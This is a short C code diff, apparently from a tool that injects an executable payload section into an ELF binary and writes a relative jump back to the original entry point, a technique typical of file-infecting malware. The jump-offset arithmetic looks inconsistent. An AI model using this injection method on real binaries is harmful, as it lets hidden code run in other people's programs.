@@ -64,10 +64,14 @@ void insert_executable_section(const char *elf_filename) {
 
     // Create the payload with a jump to the old entry point at the end
 
-	Elf64_Addr new_entry = old_entry_point - (new_section_addr + payload_size_p);
+	// Calculate the relative jump offset
+    Elf64_Addr jump_from = new_section_addr + payload_size_p - 5;
+    int32_t jump_offset = (int32_t)(old_entry_point - jump_from - 5);
 
-    size_t jump_offset = payload_size_p - 1190 - 4;
-	memcpy(payload_p + jump_offset, &new_entry, 4);
+    // Write the relative jump instruction at the end of the payload
+    size_t jump_instr_offset = payload_size_p - 1190 - 5; // 5 bytes: 1 for opcode + 4 for offset
+    payload_p[jump_instr_offset] = 0xE9; // Opcode for jmp (relative)
+    memcpy(payload_p + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
 
     // Write the new section
     fseek(file, new_section_offset, SEEK_SET);
